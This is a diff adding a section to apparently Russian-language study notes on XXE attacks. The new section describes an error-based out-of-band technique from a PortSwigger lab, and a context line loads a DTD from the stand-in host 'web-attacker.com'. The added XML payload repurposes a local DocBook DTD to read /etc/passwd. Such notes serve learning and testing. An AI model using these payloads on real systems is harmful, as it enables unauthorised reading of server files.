@@ -124,6 +124,27 @@ TODO: переделать в oob на ftp сервер. Это полезно �
 "http://web-attacker.com/malicious.dtd"> %xxe;]>
 ```
 
+### 3 Сложный OOB
+
+Это пример из сложной лабы Port Swigger
+
+Для многих парсеров есть отличия в том, как они работают со внешними и локальными (из локальных файлов) сущностями. Исследователь подтянул локальный DTD-файл (например, в GNOME всегда есть файл `/usr/share/yelp/dtd/docbookx.dtd`). Затем переопределил сущность `ISOamso` и через OOB via Error вывел результат. Полная нагрузка:
+
+```markup
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE stockCheck [
+	<!ENTITY % local_dtd SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">
+	<!ENTITY % ISOamso '
+		<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+		<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+		&#x25;eval;
+		&#x25;error;
+	'>
+	%local_dtd;
+]>
+<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+```
+
 ## XXE -> RCE
 
 на php просто, есть примеры в инете
